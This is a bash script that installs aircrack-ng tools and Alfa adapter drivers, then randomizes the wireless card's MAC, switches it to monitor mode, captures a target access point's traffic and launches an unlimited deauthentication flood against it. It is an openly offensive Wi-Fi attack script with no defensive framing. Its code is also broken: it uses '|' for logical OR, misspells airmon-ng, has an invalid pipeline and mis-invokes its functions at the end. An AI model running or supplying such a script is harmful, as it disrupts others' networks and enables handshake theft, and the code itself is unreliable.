#! /bin/bash
source .env 

cat /etc/os-release > check_Os
source check_Os

install (){
    if [[ "$ID_LIKE" == "debian" ]] | [[ "$ID" == "debian" ]]
    then
        apt update && apt upgrade -y
        apt install macchanger net-tools aircrack-ng -y
    elif [[ "$ID_LIKE" == "arch" ]] | [[ "$ID" == "arch" ]]
    then
        pacman -Syu
        pacman -S macchanger net-tools aircrack-ng -y
    else
        echo "what kind of f*uck*ng OS do you have ?"
    fi
}

Choose_antenna () {
PS3='Choose your Alfa: '
alfa=("Usb-B" "USB-C" "Quit")
select fav in "${alfa[@]}"; do
        case $fav in
            "Usb-B")
                if [[ "$ID_LIKE" == "debian" ]] | [[ "$ID" == "debian" ]]
                then
                    echo "So you have the $fav Alfa"
                    apt install firmware-ath9k-htc -y
                else
                    echo "So you have the $fav Alfa"
                    pacman -S firmware-ath9k-htc -y
                fi
                ;;
            "USB-C")
                if [[ "$ID_LIKE" == "debian" ]] | [[ "$ID" == "debian" ]]
                then
                    echo "So you have the $fav Alfa"
                    apt install realtek-rtl88xxau-dkms -y
                else
                    echo "So you have the $fav Alfa"
                    pacman -S realtek-rtl88xxau-dkms -y
                fi
                break
                ;;

            "Quit")
                echo "Passed to the Next"
                exit
                ;;
             *) echo "What da fuck are you doing ? 1,2 or 3 my man, that's all ! $REPLY";;
        esac
done
}

capture () {
    iwconfig > netcard.txt
        if [[ -s netcard.txt ]]
        then
            cut -d ' ' -f 1 netcard.txt | tr -d ' ' | sort | uniq > netcard1.txt | sed '1d' > netcard.txt
            ifconfig $(cat netcard.txt) down
            macchanger $(cat netcard.txt) -r
            iwconfig $(cat netcard.txt) mode monitor
            cut -d ' ' -f 1 netcard.txt | tr -d ' ' | sort | uniq > netcard1.txt | sed '1d' > netcard.txt
            airmong-ng start $(cat netcard.txt)
            airodump-ng -w capture_of`date +%Y-%m-%d-%H-%M` -c 2 --bssid xx:xx:xx:xx:xx:xx $(cat netcard.txt)
            aireplay-ng --deauth 0 -a xx:xx:xx:xx:xx:xx $(cat netcard.txt)

        else 
            echo "Are you sure about the connection of your alfa card, so check the connexion or the drivers or the name of your wlan network"
        fi
    }

Choose_antenna install capture
